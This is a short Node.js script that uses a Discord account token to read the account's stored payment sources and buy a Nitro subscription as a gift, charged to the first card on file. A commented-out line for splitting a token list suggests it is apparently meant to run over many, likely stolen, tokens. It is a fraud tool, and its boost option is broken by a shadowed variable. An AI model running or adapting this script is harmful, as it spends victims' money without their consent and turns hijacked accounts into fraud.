const request = require('request');
const fs = require('fs')
let nitroClassic = '521846918637420545', nitroBoost = '521847234246082599';
let clM = '499', clY = '4999', bM = '999', bY = '9999';
let token = '';
//let splitTokens = tokens.split('\n');
let url = `https://discord.com/api/v9/store/skus/${nitroClassic}/purchase`;
let boost = true;
if(boost == true) {
    let url = `https://discord.com/api/v9/store/skus/${nitroBoost}/purchase`;
}


let id = 'https://discordapp.com/api/v6/users/@me/billing/payment-sources';

request.get(id, {headers: {Authorization: token}}, async (err,res,body) => {
    let d = JSON.parse(body)    
    try{
    request.post(url, {headers: {Authorization: token}, json: {expected_amount : bM, gift: true, payment_source_id: d[0].id, sku_subscription_plan_id: '511651880837840896'}}, async(err1,res1,body1) => {
        console.log(body1);
    })
} catch {
    console.log('Couldnt purchase nitro...');
}
})
